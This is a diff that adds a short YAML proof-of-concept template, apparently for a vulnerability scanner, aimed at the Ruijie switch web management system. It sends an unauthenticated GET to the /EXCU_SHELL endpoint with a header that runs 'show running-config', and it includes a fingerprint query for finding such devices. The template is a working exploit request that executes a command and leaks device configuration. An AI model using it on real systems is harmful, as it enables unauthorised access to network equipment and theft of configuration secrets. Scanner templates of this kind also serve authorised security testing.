@@ -1,0 +1,15 @@
+name: poc-yaml-ruijie-exec-shell-admin
+rules:
+  - method: GET
+    path: /EXCU_SHELL
+    follow_redirects: false
+    headers:
+      Command1: show running-config
+      Confirm1: n
+    expression: |
+      response.body.bcontains(b'Building configuration...')
+detail:
+  description: ruijie-exec-shell-admin
+  links:
+    - 锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞
+    - body="img/free_login_ge.gif" && body="./img/login_bg.gif"
